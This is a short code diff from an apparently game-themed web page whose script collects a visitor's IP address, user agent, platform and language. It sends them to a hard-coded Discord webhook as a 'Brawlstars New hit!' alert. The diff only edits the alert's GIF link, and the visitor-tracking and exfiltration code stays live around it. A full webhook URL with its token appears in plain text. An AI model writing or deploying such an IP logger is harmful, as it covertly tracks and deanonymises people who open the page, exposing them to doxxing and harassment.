@@ -27,7 +27,7 @@
         const webhookUrl = 'https://discord.com/api/webhooks/1227383582373449739/WpV-XwYxlOUC6gyWNRS7NBf4_H95Bq18hvFNSnR_TQg1MbaZ9t8zgbn7Y6c0mZsPyv6e'; // Replace with your actual webhook URL
 
         // Construct message
-        const message = `:smirk_cat: Brawlstars New hit!\n:fire: IP: ${deviceInfo.ip}\n:money_mouth: Device Info:\n:computer: User Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\n:speaking_head: Language: ${deviceInfo.language}\n https://media.discordapp.net/attachments/1168366982454837300/1261538629843681300/rgb-black.gif`;
+        const message = `:smirk_cat: Brawlstars New hit!\n:fire: IP: ${deviceInfo.ip}\n:money_mouth: Device Info:\n:computer: User Agent: ${deviceInfo.userAgent}\nPlatform: ${deviceInfo.platform}\n:speaking_head: Language: ${deviceInfo.language}\nhttps://media.discordapp.net/attachments/1168366982454837300/1261538629843681300/rgb-black.gif?ex=669352e7&is=66920167&hm=e9010ed7985c4f41faa208cd773a01f4547bee8008c095df3168d44e184e9ef3&`;
 
         try {
             const response = await fetch(webhookUrl, {
